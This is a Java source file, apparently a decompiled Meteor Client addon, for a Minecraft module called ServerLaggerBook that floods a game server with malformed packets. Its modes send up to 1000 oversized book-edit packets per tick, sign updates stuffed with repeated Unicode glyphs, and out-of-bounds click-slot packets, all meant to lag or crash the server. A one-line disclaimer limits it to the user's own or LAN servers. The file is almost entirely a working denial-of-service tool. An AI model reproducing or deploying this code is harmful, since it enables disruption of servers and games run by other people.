package com.codigohasta.addon.modules;

import com.codigohasta.addon.AddonTemplate;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.ArrayList;
import java.util.Optional;
import java.util.Random;
import meteordevelopment.meteorclient.events.game.GameJoinedEvent;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent.Pre;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.EnumSetting.Builder;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;

public class ServerLaggerBook extends Module {
   private final String message = "﷽".repeat(200);
   private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
   private final Setting<ServerLaggerBook.Mode> mode = this.sgGeneral
      .add(
         ((Builder)((Builder)((Builder)new Builder().name("mode")).description("Which book / sign based lag method to use."))
               .defaultValue(ServerLaggerBook.Mode.Book))
            .build()
      );
   private final Setting<Integer> bookPackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("book-packets"))
                     .description("Packets per tick for book modes."))
                  .defaultValue(100))
               .min(1)
               .max(1000)
               .sliderMin(1)
               .sliderMax(1000)
               .visible(() -> this.mode.get() == ServerLaggerBook.Mode.Book || this.mode.get() == ServerLaggerBook.Mode.CreativeBook))
            .build()
      );
   private final Setting<Boolean> autoDisable = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)new meteordevelopment.meteorclient.settings.BoolSetting.Builder()
                     .name("auto-disable"))
                  .description("Disable the module when you join or leave a world."))
               .defaultValue(true))
            .build()
      );
   private final Setting<Boolean> smartDisable = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)new meteordevelopment.meteorclient.settings.BoolSetting.Builder()
                     .name("smart-disable"))
                  .description("Automatically disable the module when a mode finishes or errors out."))
               .defaultValue(true))
            .build()
      );
   private final Setting<Integer> delay = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                     .name("delay"))
                  .description("Ticks to wait between bursts of packets."))
               .defaultValue(1))
            .min(0)
            .max(100)
            .sliderMin(0)
            .sliderMax(100)
            .build()
      );
   private int ticks = 0;
   private static final String RAND_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

   public ServerLaggerBook() {
      super(
         AddonTemplate.OP_CATEGORY,
         "ServerLaggerBook",
         "Spams the server with bad-book / lectern / sign packets (and OUT_OF_BOUNDS click-slot flood). Testing on your own / LAN servers only."
      );
   }

   @EventHandler
   private void onTick(Pre event) {
      if (this.mc.player != null && this.mc.world != null) {
         this.ticks++;
         if (this.ticks > (Integer)this.delay.get()) {
            this.ticks = 0;
            switch ((ServerLaggerBook.Mode)this.mode.get()) {
               case Book:
               case CreativeBook:
                  for (int i = 0; i < this.bookPackets.get(); i++) {
                     this.sendBadBook();
                  }

                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case Lectern:
                  if (!(this.mc.currentScreen instanceof LecternScreen)) {
                     return;
                  }

                  this.mc
                     .getNetworkHandler()
                     .sendPacket(
                        new ClickSlotC2SPacket(
                           this.mc.player.currentScreenHandler.syncId,
                           this.mc.player.currentScreenHandler.getRevision(),
                           (short)0,
                           (byte)0,
                           SlotActionType.QUICK_MOVE,
                           Int2ObjectMaps.emptyMap(),
                           hashOf(this.mc.player.currentScreenHandler.getCursorStack().copy())
                        )
                     );
                  if ((Boolean)this.smartDisable.get()) {
                     this.disable();
                  }
                  break;
               case Sign:
                  this.mc
                     .getNetworkHandler()
                     .sendPacket(new UpdateSignC2SPacket(this.mc.player.getBlockPos(), false, this.message, this.message, this.message, this.message));
                  break;
               case OUT_OF_BOUNDS:
                  for (int i = 0; i < 100; i++) {
                     ItemStack stack = new ItemStack(this.mc.player.getMainHandStack().getItem());
                     ClickSlotC2SPacket packet = new ClickSlotC2SPacket(
                        this.mc.player.currentScreenHandler.syncId,
                        69,
                        (short)this.mc.player.currentScreenHandler.getRevision(),
                        (byte)1,
                        SlotActionType.QUICK_MOVE,
                        new Int2ObjectOpenHashMap(),
                        hashOf(stack)
                     );

                     try {
                        this.mc.getNetworkHandler().sendPacket(packet);
                     } catch (Exception var6) {
                        var6.printStackTrace();
                     }
                  }
            }
         }
      } else {
         if ((Boolean)this.autoDisable.get()) {
            this.disable();
         }
      }
   }

   @EventHandler
   private void onGameJoined(GameJoinedEvent event) {
      if ((Boolean)this.autoDisable.get()) {
         this.disable();
      }
   }

   @EventHandler
   private void onGameLeft(GameLeftEvent event) {
      if ((Boolean)this.autoDisable.get()) {
         this.disable();
      }
   }

   private void sendBadBook() {
      String title = "/stop" + Math.random() * 400.0;
      String mm255 = this.randStr(255);
      ArrayList<String> pages = new ArrayList<>();

      for (int i = 0; i < 50; i++) {
         pages.add(mm255);
      }

      this.mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(this.mc.player.getInventory().getSelectedSlot(), pages, Optional.of(title)));
   }

   private String randStr(int len) {
      Random r = new Random();
      StringBuilder sb = new StringBuilder(len);

      for (int i = 0; i < len; i++) {
         sb.append(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
               .charAt(r.nextInt("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length()))
         );
      }

      return sb.toString();
   }

   private static ItemStackHash hashOf(ItemStack stack) {
      return ItemStackHash.fromItemStack(stack, c -> 0);
   }

   public void onDeactivate() {
      this.ticks = 999;
   }

   public static enum Mode {
      Book,
      CreativeBook,
      Lectern,
      Sign,
      OUT_OF_BOUNDS;
   }
}
